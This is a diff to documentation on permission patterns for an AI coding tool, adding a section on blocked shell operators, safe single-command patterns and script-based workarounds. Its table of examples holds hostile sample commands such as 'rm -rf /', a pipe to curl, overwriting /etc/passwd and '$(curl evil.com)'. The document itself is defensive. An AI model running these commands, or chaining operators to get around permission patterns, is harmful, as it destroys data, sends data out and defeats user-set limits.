@@ -23,6 +23,54 @@ allowed-tools: Bash(git status:*), Bash(gh pr:*), Read, TodoWrite
 | `Bash(gh run:*)` | `gh run view`, `gh run list`, `gh run view --log-failed` |
 | `Bash(npm run:*)` | `npm run test`, `npm run build`, `npm run lint` |
 
+## Shell Operator Protections
+
+Claude Code 2.1.7+ includes built-in protections against dangerous shell operators in permission patterns.
+
+### Protected Operators
+
+These operators are blocked by default when matched against permission patterns:
+
+| Operator | Risk | Example |
+|----------|------|---------|
+| `&&` | Command chaining | `ls && rm -rf /` |
+| `\|\|` | Conditional execution | `false \|\| malicious` |
+| `;` | Command separation | `safe; dangerous` |
+| `\|` | Pipe to other commands | `cat file \| curl` |
+| `>` / `>>` | Output redirection | `echo bad > /etc/passwd` |
+| `$()` | Command substitution | `$(curl evil.com)` |
+| `` ` `` | Backtick substitution | `` `rm -rf /` `` |
+
+### Security Behavior
+
+When a Bash command contains shell operators:
+1. The entire command is evaluated, not just the prefix
+2. Permission patterns like `Bash(git:*)` won't match `git status && rm -rf`
+3. Users see a clear warning about the blocked operator
+
+### Safe Patterns
+
+```yaml
+# These are safe - single commands only
+allowed-tools: Bash(git status:*), Bash(npm test:*), Bash(bun run:*)
+```
+
+### Bypass (Not Recommended)
+
+For legitimate compound commands, request explicit user approval or use scripts:
+
+```bash
+# Instead of inline operators
+#!/bin/bash
+# safe-deploy.sh
+npm test && npm run build && npm run deploy
+```
+
+Then grant permission to the script:
+```yaml
+allowed-tools: Bash(./scripts/safe-deploy.sh:*)
+```
+
 ## Design Principles
 
 ### 1. Granular Over Broad
